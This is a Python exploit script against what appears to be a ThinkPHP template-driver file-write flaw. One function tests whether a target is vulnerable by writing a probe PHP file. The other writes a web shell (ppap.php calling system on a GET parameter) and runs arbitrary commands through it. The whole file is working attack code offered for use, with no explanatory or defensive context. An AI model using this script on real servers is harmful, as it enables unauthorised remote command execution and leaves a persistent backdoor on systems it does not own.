import requests

headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25',
    'Content-Type': 'application/x-www-form-urlencoded',
}

def exp_check(url):
    try:
        requests.get(url + "/index.php?s=index/\\think\\template\\driver\\file/write&cacheFile=p.php&content=%3C?php%20var_dump(check);?%3E",headers=headers,verify=False)
        rp = requests.get(url + "/p.php",headers=headers,verify=False)
        if rp.status_code==200 and 'check' in rp.text:
            return 1
        else:
            return 2
    except Exception as e:
        str(e)+str(e.__traceback__.tb_lineno)+'行'
        return 3


def exp_cmd(url,cmd):
    try:
       
        requests.get(url + "/index.php?s=index/\\think\\template\\driver\\file/write&cacheFile=ppap.php&content=%3C?php%20system($_GET['cmd']);?%3E",headers=headers,verify=False)
        rp = requests.get(url + "/ppap.php?cmd="+cmd,headers=headers,verify=False)
        if  rp.text!="" and rp.status_code == 200:
           return rp.text


    except Exception as e:
        str(e)+str(e.__traceback__.tb_lineno)+'行'
        return 3
